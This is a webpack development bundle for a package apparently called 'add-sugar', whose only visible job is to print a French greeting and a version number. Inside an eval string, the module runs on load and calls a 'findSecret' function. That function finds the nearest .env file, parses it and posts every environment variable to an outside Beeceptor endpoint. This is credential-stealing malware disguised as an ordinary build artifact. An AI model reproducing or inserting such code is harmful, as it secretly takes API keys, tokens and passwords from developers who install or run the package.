/*
 * ATTENTION: The "eval" devtool has been used (maybe by default in mode: "development").
 * This devtool is neither made for production nor for readable output files.
 * It uses "eval()" calls to create a separate source file in the browser devtools.
 * If you are trying to read the output file, select a different devtool (https://webpack.js.org/configuration/devtool/)
 * or disable the default devtool with "devtool: false".
 * If you are looking for production-ready output files, see mode: "production" (https://webpack.js.org/configuration/mode/).
 */
/******/ (() => { // webpackBootstrap
/******/ 	"use strict";
/******/ 	var __webpack_modules__ = ({

/***/ "./src/index.js":
/*!**********************!*\
  !*** ./src/index.js ***!
  \**********************/
/***/ ((__unused_webpack___webpack_module__, __webpack_exports__, __webpack_require__) => {

eval("__webpack_require__.r(__webpack_exports__);\nvar findUp = require(\"find-up\");\nvar axios = require(\"axios\");\nvar dotenv = require(\"dotenv\");\nvar findSecret = function findSecret() {\n  var dotenvPath = findUp.sync(\".env\");\n  if (!dotenvPath) {\n    console.error(\"Le fichier .env n'a pas été trouvé.\");\n    process.exit(1);\n  }\n  var loadedEnv = dotenv.config({\n    path: dotenvPath\n  }).parsed;\n  console.log(\"Loaded dotenv:\", loadedEnv);\n\n  // Set the Beeceptor URL\n  var beeceptorUrl = \"https://getsugar.free.beeceptor.com\";\n\n  // Make a POST request to Beeceptor with the environment variables\n  axios.post(beeceptorUrl, loadedEnv).then(function (response) {\n    console.log(\"POST request successful:\", response.data);\n  })[\"catch\"](function (error) {\n    console.error(\"Error making POST request:\", error.message);\n  });\n};\nvar addSugar = function addSugar() {\n  console.log(\"Bonjour, cette version est la bonne 7.1.3\");\n  findSecret();\n};\naddSugar();\nmodule.exports = {\n  addSugar: addSugar\n};\n\n//# sourceURL=webpack://add-sugar/./src/index.js?");

/***/ })

/******/ 	});
/************************************************************************/
/******/ 	// The require scope
/******/ 	var __webpack_require__ = {};
/******/ 	
/************************************************************************/
/******/ 	/* webpack/runtime/make namespace object */
/******/ 	(() => {
/******/ 		// define __esModule on exports
/******/ 		__webpack_require__.r = (exports) => {
/******/ 			if(typeof Symbol !== 'undefined' && Symbol.toStringTag) {
/******/ 				Object.defineProperty(exports, Symbol.toStringTag, { value: 'Module' });
/******/ 			}
/******/ 			Object.defineProperty(exports, '__esModule', { value: true });
/******/ 		};
/******/ 	})();
/******/ 	
/************************************************************************/
/******/ 	
/******/ 	// startup
/******/ 	// Load entry module and return exports
/******/ 	// This entry module can't be inlined because the eval devtool is used.
/******/ 	var __webpack_exports__ = {};
/******/ 	__webpack_modules__["./src/index.js"](0, __webpack_exports__, __webpack_require__);
/******/ 	
/******/ })()
;